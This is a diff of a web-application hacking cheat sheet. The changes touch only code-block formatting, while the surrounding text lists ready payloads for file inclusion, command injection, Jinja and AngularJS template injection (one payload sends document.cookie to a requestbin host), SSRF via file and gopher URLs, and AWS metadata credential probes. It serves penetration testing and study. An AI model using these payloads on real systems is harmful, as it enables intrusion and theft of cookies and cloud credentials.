@@ -147,7 +147,7 @@ Other things:
 * Try URL paths without `.php` as source code may concat `.php` to the end of the user-input.
 
 STEP #1: Verify existence of LFI/LFD vulnerability.
-```
+```http
 domain.com/?p=somepage.txt
 domain.com/?p=pagename-whatever
 domain.com/?class=something&function=another 
@@ -156,21 +156,21 @@ domain.com/?class=something&function=another
 STEP #2: Figure out where the logfiles are. Example locations:
 * NOTE: If you can execute phpinfo(); then you can find out where access/error logs are stored on the server.
 * For non-default locations, try to figure out where they install their PHP, Nginx, Apache and look in there.
-```
-// PHP Logfiles:
+```html
+<!-- PHP Logfiles: -->
 /usr/local/etc/php
 /etc/php.d/*.ini
 /etc/php5/cli/php.ini
 /usr/local/lib/php.ini
 /etc/php.ini
   
-// Apache Logfiles:
+<!-- Apache Logfiles: -->
 /var/log/apache2/access.log
 /var/log/httpd/error_log
 /var/log/apache2/error.log
 /var/log/httpd-error.log
 
-// Other default logfile locations:
+<!-- Other default logfile locations: -->
 1. Look @ HTTP response 'Server' header to see what distribution they are using e.g. (Debian)
 2. Google 'default Debian apache log directory' etc.
 ```
@@ -234,7 +234,7 @@ C:/windows/system32/drivers/etc/hosts
 ```
 
 Other things to try:
-```
+``` 
 TRY OTHER PROTOCOLS:
 http://, ftp:// etc.
 
@@ -413,7 +413,7 @@ Other things:
 
 **Command Injection**
 Examples:
-```
+```http
 http://shitesite/lol.php?path=cat%20/etc/passwd
 http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
 ```  
@@ -447,7 +447,7 @@ READ SOME SSTI writeups:
 * https://hackerone.com/reports/125980
 
 Flask template injection:  
-```python
+```jinja
 {{4+4}}
 /* Request object gives you request context: {{request.__dict__}} which tells you everything about your request.
  * This is 'server-side disclosure of info' which is a vuln category itself.
@@ -458,7 +458,7 @@ Flask template injection:
 ```
 
 More Flask/Jinja template injection:
-```python
+```jinja
 # Dump all used classes
   {{ ''.__class__.__mro__[2].__subclasses__() }}
 # Read File
@@ -474,12 +474,12 @@ More Flask/Jinja template injection:
 ```
 
 Working AngularJS payload (EXT BREAK #2):
-```angular
+```javascript
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=5+5,new Image().src="http://requestbin.fullcontact.com/1b17hka1?asdf="+document.cookie,alert(2)');}}
 ```
 
 Angular JS:
-```angular
+```javascript
 {{ 7*7 }} => 49
 {{ this }}
 {{ this.toString() }}
@@ -578,7 +578,7 @@ SSRF indicators:
 * Look for redirects
 
 File Protocol (access a server's file system)
-```
+```http
 file:///etc/passwd
 file:///proc/self/cmdline
 file:///proc/self/exe
@@ -587,7 +587,7 @@ curl file:///etc/passwd
 ```
 
 Other Protocols
-```
+```http
 gopher://127.0.0.1:3306/_<PAYLOAD>      // MySQL
 gopher://127.0.0.1:9000                 // FastCGI
 gopher://127.0.0.1:6379                 // Redis
@@ -599,7 +599,7 @@ jar://
 ```
 
 Elastic Search APIs (default port:9200/9300):
-```
+```http
 http://0:9200/_search?q={flag, sectalks, 6443 . . .}
 http://0:9200/_cluster/settings
 http://0:9200/_cluster/state
@@ -618,7 +618,7 @@ curl_exec()
 ```
 
 Bypass 'localhost' filters:
-```
+```http
 http://{localhost_variation}
 127.0.0.1
 192.168.1.1
@@ -662,7 +662,7 @@ Confirm SSRF with `http://169.254.169.254` as the payload.
 
 Typical Steps:
 1. Find info / dump data in AWS instance.
-```
+```http
 http://169.254.169.254/latest/meta-data/iam/info   // Find an IAM role with access to the AWS resources.
 http://169.254.169.254/latest/user-data
 ```
